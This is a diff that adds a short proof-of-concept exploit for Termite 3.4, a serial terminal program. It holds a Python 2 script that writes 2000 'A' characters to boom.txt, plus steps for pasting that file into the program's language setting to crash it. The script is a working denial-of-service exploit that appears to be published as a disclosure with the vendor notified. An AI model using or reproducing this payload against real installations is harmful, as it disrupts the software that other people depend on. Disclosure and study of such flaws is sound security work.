@@ -1,0 +1,25 @@
+# Exploit Title: Termite 3.4 - Denial of Service (PoC)
+# Author: Abdullah Alıç
+# Discovey Date: 2018-09-23
+# Vendor notified : 2018-09-24
+# Homepage: https://www.compuphase.com
+# Software Link: https://www.compuphase.com/software_termite.htm
+# Tested Version: 3.4
+# Tested on OS: Windows XP Professional sp3 (ENG)
+# Steps to Reproduce: Run the python exploit script, it will create a new file
+# file with the name "boom.txt". Copy the content of the new file "boom.txt". 
+# Start termite 3.4 terminal click "Settings" Paste the content into field "User interface langauge" click "OK" 
+  
+#!/usr/bin/python
+   
+buffer = "A" * 2000
+
+payload = buffer
+try:
+    f=open("boom.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
